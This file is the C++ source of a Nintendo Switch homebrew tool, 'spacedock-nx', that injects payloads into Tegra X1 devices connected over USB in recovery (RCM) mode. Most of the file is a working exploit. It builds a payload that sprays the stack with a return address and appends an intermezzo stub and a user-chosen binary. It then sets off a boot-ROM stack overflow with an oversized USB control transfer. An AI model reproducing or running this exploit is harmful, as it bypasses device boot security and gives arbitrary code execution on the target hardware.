/*
 * Copyright (c) 2026 ndeadly
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms and conditions of the GNU General Public License,
 * version 2, as published by the Free Software Foundation.
 *
 * This program is distributed in the hope it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <switch.h>
#include <algorithm>
#include <cstdlib>
#include <cstdio>
#include <cstdarg>
#include <cstring>
#include <dirent.h>
#include "results.hpp"
#include "scope_guard.hpp"

#ifdef __cplusplus
extern "C" {
#endif

void userAppInit(void) {
    R_ABORT_UNLESS(usbHsInitialize());
    R_ABORT_UNLESS(romfsInit());
    fsdevMountSdmc();
}

void userAppExit(void) {
    fsdevUnmountAll();
    romfsExit();
    usbHsExit();
}

#ifdef __cplusplus
}
#endif

constexpr u16 RcmVendorId  = 0x0955;
constexpr u16 RcmProductId = 0x7321;

constexpr u64 RcmPayloadAddress   = 0x40010000;
constexpr u64 IntermezzoLocation  = 0x4001F000;
constexpr u64 PayloadLoadBlock    = 0x40020000;
constexpr size_t PayloadChunkSize = 0x1000;

constexpr const char IntermezzoFileLocation[]      = "romfs:/intermezzo.bin";
constexpr const char EmbeddedPayloadFileLocation[] = "romfs:/fusee.bin";

constexpr const char BootPayloadFileLocation[]     = "sdmc:/payload.bin";
constexpr const char RebootPayloadFileLocation[]   = "sdmc:/reboot_payload.bin";
constexpr const char ApplicationPayloadDirectory[] = "sdmc:/config/spacedock-nx/payloads";
constexpr const char HekatePayloadDirectory[]      = "sdmc:/bootloader/payloads";

constexpr size_t MaxPayloadLength = 0x30298;
constinit u8 g_payload_buffer[MaxPayloadLength] = {};

constexpr size_t ControlXferBufferLength = 0x7000;
alignas(0x1000) u8 g_control_xfer_buffer[ControlXferBufferLength] = {};

struct FilePath {
    char path[FS_MAX_PATH];
};

constexpr size_t MaxPayloads = 20;
constinit const char *g_current_payload_location = nullptr;

UEvent g_exit_event;
Mutex g_print_mutex;

void locked_printf(const char* fmt, ...) {
    mutexLock(&g_print_mutex);
    ON_SCOPE_EXIT { mutexUnlock(&g_print_mutex); };

    std::va_list va;
    va_start(va, fmt);
    std::vprintf(fmt, va);
    va_end(va);
    consoleUpdate(NULL);
}

bool HasBinExtension(const char *file_name) {
    const char *ext = std::strrchr(file_name, '.');
    return ext && std::strcmp(ext, ".bin") == 0;
}

int EnumeratePayloads(FilePath *payloads, int max_payloads) {
    int count = 0;

    /* Add embedded fusee payload. */
    std::strncpy(payloads[count++].path, EmbeddedPayloadFileLocation, FS_MAX_PATH - 1);
    if (count == max_payloads) return count;

    /* Scan spacedock-nx payload directory for payloads. */
    DIR *application_dir = opendir(ApplicationPayloadDirectory);
    if (application_dir != NULL) {
        ON_SCOPE_EXIT { closedir(application_dir); };

        struct dirent *entry;
        while ((entry = readdir(application_dir)) != NULL) {
            if (std::strcmp(entry->d_name, ".") == 0 ||
                std::strcmp(entry->d_name, "..") == 0)
                continue;

            if (!HasBinExtension(entry->d_name))
                continue;

            std::snprintf(payloads[count++].path, FS_MAX_PATH, "%s/%s", ApplicationPayloadDirectory, entry->d_name);
            if (count == max_payloads) return count;
        }
    }

    /* Scan hekate payload directory for payloads. */
    DIR *hekate_dir = opendir(HekatePayloadDirectory);
    if (hekate_dir != NULL) {
        ON_SCOPE_EXIT { closedir(hekate_dir); };

        struct dirent *entry;
        while ((entry = readdir(hekate_dir)) != NULL) {
            if (std::strcmp(entry->d_name, ".") == 0 ||
                std::strcmp(entry->d_name, "..") == 0)
                continue;

            if (!HasBinExtension(entry->d_name))
                continue;

            std::snprintf(payloads[count++].path, FS_MAX_PATH, "%s/%s", HekatePayloadDirectory, entry->d_name);
            if (count == max_payloads) return count;
        }
    }

    /* Check SD card root for reboot_payload.bin. */
    FILE *reboot_payload = std::fopen(RebootPayloadFileLocation, "rb");
    if (reboot_payload != NULL) {
        ON_SCOPE_EXIT { std::fclose(reboot_payload); };

        std::strncpy(payloads[count++].path, RebootPayloadFileLocation, FS_MAX_PATH - 1);
        if (count == max_payloads) return count;
    }

    /* Check SD card root for payload.bin. */
    FILE *boot_payload = std::fopen(BootPayloadFileLocation, "rb");
    if (boot_payload != NULL) {
        ON_SCOPE_EXIT { std::fclose(boot_payload); };

        std::strncpy(payloads[count++].path, BootPayloadFileLocation, FS_MAX_PATH - 1);
        if (count == max_payloads) return count;
    }

    return count;
}

size_t ConstructRcmPayload(const char *payload_path) {
    /* Zero payload buffer. */
    std::memset(g_payload_buffer, 0, MaxPayloadLength);

    /* Add payload length to start of payload. */
    *reinterpret_cast<u32*>(&g_payload_buffer[0]) = MaxPayloadLength;

    /* Fill stack with intermezzo address. */
    int payload_idx = 680;
    for (u64 i = RcmPayloadAddress; i < IntermezzoLocation; i += sizeof(u32)) {
        *reinterpret_cast<u32*>(&g_payload_buffer[payload_idx]) = IntermezzoLocation;
        payload_idx += sizeof(u32);
    }

    /* Add intermezzo code. */
    std::FILE* intermezzo_file = std::fopen(IntermezzoFileLocation, "rb");
    if (intermezzo_file) {
        int file_length = std::fread(&g_payload_buffer[payload_idx], 1, MaxPayloadLength-payload_idx, intermezzo_file);
        std::fclose(intermezzo_file);
        if (file_length > 0) {
            locked_printf("Read %d bytes from %s\n", file_length, IntermezzoFileLocation);
        }
    }

    /* Pad until payload. */
    payload_idx += PayloadLoadBlock - IntermezzoLocation;

    /* Read actual payload into buffer. */
    std::FILE* payload_file = std::fopen(payload_path, "rb");
    if (payload_file) {
        int file_length = std::fread(&g_payload_buffer[payload_idx], 1, MaxPayloadLength-payload_idx, payload_file);
        std::fclose(payload_file);
        if (file_length > 0) {
            payload_idx += file_length;
            locked_printf("Read %d bytes from %s\n", file_length, payload_path);
        }
    }

    return payload_idx;
}

Result SendRcmPayload(UsbHsClientIfSession *if_session, const char *payload_path) {
    /* Locate endpoint descriptors. */
    usb_endpoint_descriptor *ep_in_desc  = &if_session->inf.inf.input_endpoint_descs[0];
    usb_endpoint_descriptor *ep_out_desc = &if_session->inf.inf.output_endpoint_descs[0];

    /* Open input endpoint. */
    UsbHsClientEpSession ep_in_session;
    R_TRY(usbHsIfOpenUsbEp(if_session, &ep_in_session, 1, ep_in_desc->wMaxPacketSize, ep_in_desc));
    ON_SCOPE_EXIT { usbHsEpClose(&ep_in_session); };

    /* Open output endpoint. */
    UsbHsClientEpSession ep_out_session;
    R_TRY(usbHsIfOpenUsbEp(if_session, &ep_out_session, 1, PayloadChunkSize, ep_out_desc));
    ON_SCOPE_EXIT { usbHsEpClose(&ep_out_session); };

    /* Create aligned buffer for transfers. */
    alignas(0x1000) u8 transfer_buffer[0x1000] = {};

    /* Read device ID. Required before we can transfer the payload. */
    locked_printf("Reading device ID...\n");
    u32 rx_size = 0;
    R_TRY(usbHsEpPostBuffer(&ep_in_session, transfer_buffer, 0x10, &rx_size));

    /* Construct the master payload. */
    locked_printf("Constructing payload...\n");
    size_t payload_len = ConstructRcmPayload(payload_path);

    /* Transfer the payload. */
    locked_printf("Transferring payload...\n");
    int low_buffer = 1;
    for (size_t payload_idx = 0; payload_idx < payload_len || low_buffer; payload_idx += PayloadChunkSize, low_buffer ^= 1) {
        /* Copy chunk into transfer buffer. */
        std::memcpy(transfer_buffer, &g_payload_buffer[payload_idx], PayloadChunkSize);

        /* Post buffer to the output endpoint. */
        u32 tx_size = 0;
        R_TRY(usbHsEpPostBuffer(&ep_out_session, transfer_buffer, PayloadChunkSize, &tx_size));
    }

    /* Trigger the exploit via large control transfer. Note we don't check return value for failure here, it's expected. */
    locked_printf("Smashing the stack...\n");
    u32 tx_size;
    usbHsIfCtrlXfer(if_session, USB_RECIPIENT_ENDPOINT | USB_ENDPOINT_IN, USB_REQUEST_GET_STATUS, 0, 0, ControlXferBufferLength, g_control_xfer_buffer, &tx_size);

    R_SUCCEED();
}

void UsbEventThreadFunction(void *arg) {
    /* Define interface filter for TX1 RCM devices. */
    const UsbHsInterfaceFilter interface_filter = {
        .Flags = UsbHsInterfaceFilterFlags_idVendor | UsbHsInterfaceFilterFlags_idProduct | UsbHsInterfaceFilterFlags_bcdDevice_Min,
        .idVendor = RcmVendorId,
        .idProduct = RcmProductId,
        .bcdDevice_Min = 0
    };

    /* Create USB interface available interface. */
    Event interface_available_event;
    R_ABORT_UNLESS(usbHsCreateInterfaceAvailableEvent(&interface_available_event, true, 0, &interface_filter));

    while (true) {
        int event_index;
        if (R_SUCCEEDED(waitMulti(&event_index, UINT64_MAX, waiterForUEvent(&g_exit_event), waiterForEvent(&interface_available_event)))) {
            /* Exit event was signalled. Break out of loop.  */
            if (event_index == 0)
                break;

            /* USB interface is available. */
            s32 total_entries;
            UsbHsInterface interface;
            if (R_SUCCEEDED(usbHsQueryAvailableInterfaces(&interface_filter, &interface, sizeof(interface), &total_entries)) && (total_entries > 0)) {
                locked_printf("RCM device detected.\n");

                /* Acquire interface. */
                UsbHsClientIfSession if_session;
                if (R_SUCCEEDED(usbHsAcquireUsbIf(&if_session, &interface))) {
                    ON_SCOPE_EXIT { usbHsIfClose(&if_session); };

                    /* Send the RCM payload. */
                    Result rc = SendRcmPayload(&if_session, g_current_payload_location);
                    if (R_FAILED(rc)) {
                        locked_printf("Failure! (rc=0x%X)\n", rc);
                    }
                }
            }
        }
    }

    usbHsDestroyInterfaceAvailableEvent(&interface_available_event, 0);
}

void UpdateMenuSelection(const FilePath *payloads, int count, int menu_selection) {
    mutexLock(&g_print_mutex);
    ON_SCOPE_EXIT { mutexUnlock(&g_print_mutex); };

    /* Move cursor to start of row 9. */
    std::printf("\x1b[9;0H");

    /* Clear until the end of the screen. */
    std::printf("\x1b[J");

    /* Re-draw the payload menu*/
    std::printf("Available payloads:\n");
    for (int i = 0; i < count; ++i) {
        std::printf(" %c%s\n",
            i == menu_selection ? '>' : ' ',
            payloads[i].path
        );
    }

    /* Update the selected payload path. */
    g_current_payload_location = payloads[menu_selection].path;
    std::printf("\nSelected payload: %s\n\n", g_current_payload_location);

    consoleUpdate(NULL);
}

int main(int argc, char* argv[]) {
    appletLockExit();
    consoleInit(NULL);

    locked_printf(
        "spacedock-nx. 2026 ndeadly\n"
        "\n"
        "Press + to exit.\n"
        "\n"
        "Usage:\n"
        "  Select payload with up/down on the dpad.\n"
        "  Connect RCM mode device via USB to inject selected payload.\n"
        "\n"
    );

    mutexInit(&g_print_mutex);
    ueventCreate(&g_exit_event, false);

    /* Enumerate available payloads. */
    FilePath payloads[MaxPayloads] = {};
    int total_payloads = EnumeratePayloads(payloads, MaxPayloads);

    int menu_selection = 0;
    UpdateMenuSelection(payloads, total_payloads, menu_selection);

    /* Create thread for handling USB events. */
    Thread usb_event_thread;
    R_ABORT_UNLESS(threadCreate(&usb_event_thread, UsbEventThreadFunction, nullptr, nullptr, 0x8000, 0x2C, -2));
    R_ABORT_UNLESS(threadStart(&usb_event_thread));

    padConfigureInput(8, HidNpadStyleSet_NpadStandard);

    PadState pad;
    padInitializeAny(&pad);

    u64 kDown;
    while (appletMainLoop()) {
        padUpdate(&pad);
        kDown = padGetButtonsDown(&pad);

        if (kDown & HidNpadButton_Plus)
            break;

        if (kDown & HidNpadButton_Up) {
            menu_selection = std::clamp(menu_selection - 1, 0, total_payloads - 1);
            UpdateMenuSelection(payloads, total_payloads, menu_selection);
        }

        if (kDown & HidNpadButton_Down) {
            menu_selection = std::clamp(menu_selection + 1, 0, total_payloads - 1);
            UpdateMenuSelection(payloads, total_payloads, menu_selection);
        }

        svcSleepThread(1e7);
    }

    /* Signal exit event and wait for USB event thread to terminate before closing. */
    ueventSignal(&g_exit_event);
    threadWaitForExit(&usb_event_thread);
    threadClose(&usb_event_thread);

    consoleExit(NULL);
    appletUnlockExit();

    return 0;
}
